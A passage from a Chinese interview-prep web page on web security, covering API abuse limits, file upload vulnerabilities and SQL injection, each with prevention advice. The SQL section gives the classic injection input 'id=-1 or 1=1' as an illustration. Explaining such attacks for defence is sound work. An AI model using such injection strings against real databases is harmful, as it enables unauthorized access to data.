<ul><li><strong>总调用次数受限制</strong>。这个一般是在<strong>后端做限制</strong>，单位时间内最多可调用次数。</li> <li><strong>同一客户端次数限制</strong>。这个<strong>前端的一般使用</strong>是给接口调用加锁，在返回结果或者一定时间之后解锁。</li></ul></li></ol> <p><strong>刷接口</strong>直接走脚本，前端限制有一定作用，但不大。</p> <ul><li>根据<code>IP</code>限制调用次数【请求在代理服务器被拦截<code>nginx</code>，减少后端服务被调用】；</li> <li>拦截器特定信息校验，例如：<code>token</code>【后端服务器拦截器，减少业务判断和处理】； 1、校验请求头referer 2、校验请求token； 3、请求频率</li> <li><code>http</code>请求头信息校验；（例如<code>host</code>，<code>User-Agent</code>，<code>Referer</code>）; referer校验; UA校验;</li> <li>对用户唯一身份uid进行限制和校验。例如基本的长度，组合方式，甚至有效性进行判断。或者uid具有一定的时效性 ;</li> <li>前后端协议采用二进制方式进行交互或者协议采用签名机制;</li> <li>机验证，验证码，短信验证码，滑动图片形式，12306形式 ;</li></ul> <h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="header-anchor">#</a> 文件上传漏洞</h3> <p>服务器未校验上传的文件，致使黑客可以上传恶意脚本等方式。</p> <p><strong>预防策略</strong></p> <ol><li>用文件头来检测文件类型，<strong>使用白名单过滤(有些文件可以从其中一部分执行，只检查文件头无效，例如 PHP 等脚本语言)；</strong></li> <li><strong>上传后将文件彻底重命名并移动到不可执行的目录下</strong>；</li> <li>升级服务器软件以避免路径解析漏洞；</li> <li>升级用到的开源编辑器；</li> <li>管理后台设置强密码。</li></ol> <h3 id="sql注入"><a href="#sql注入" class="header-anchor">#</a> SQL注入</h3> <p>拼接 SQL 时未仔细过滤，黑客可提交畸形数据改变语义。比如查某个文章，提交了这样的数据<code>id=-1 or 1=1</code>等。1=1 永远是true，导致where语句永远是ture.那么查询的结果相当于整张表的内容，攻击者就达到了目的。或者，通过屏幕上的报错提示推测 SQL 语句等。</p> <p><strong>预防策略</strong></p> <ol><li>禁止目标网站利用动态拼接字符串的方式访问数据库</li> <li>减少不必要的数据库抛出的错误信息</li> <li>对数据库的操作赋予严格的权限控制</li> <li>净化和过滤掉不必要的SQL保留字，比如：where, or, exec 等</li> <li>不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双&quot;-&quot;进行转换等</li> <li>不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取</li> <li>不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接</li> <li>不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息</li></ol></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><!----> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2022/04/15, 05:41:33</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/rat-summ/pages/c9b4ac/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">面试重新梳理</div></a> <a href="/rat-summ/pages/zinter-core-hard/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">核心手写原理精选</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/rat-summ/pages/c9b4ac/" class="prev">面试重新梳理</a></span> <span class="next"><a href="/rat-summ/pages/zinter-core-hard/">核心手写原理精选</a>→
      </span></p></div></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:yessz@foxmail.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/samyzh" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://music.163.com/" title="听音乐" target="_blank" class="iconfont icon-erji"></a></div> 
    Copyright © 2015-2022
    <span><a href='https://my.samyz.cn' target='_blank'>友一升 | yessz</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">×</i> <div><!-- 固定160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;width:160px;height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><!----></div></div>
    <script src="/rat-summ/assets/js/app.12c8e251.js" defer></script><script src="/rat-summ/assets/js/3.9ee9750d.js" defer></script><script src="/rat-summ/assets/js/2.7c04700d.js" defer></script><script src="/rat-summ/assets/js/126.5b6d9993.js" defer></script>
  </body>
</html>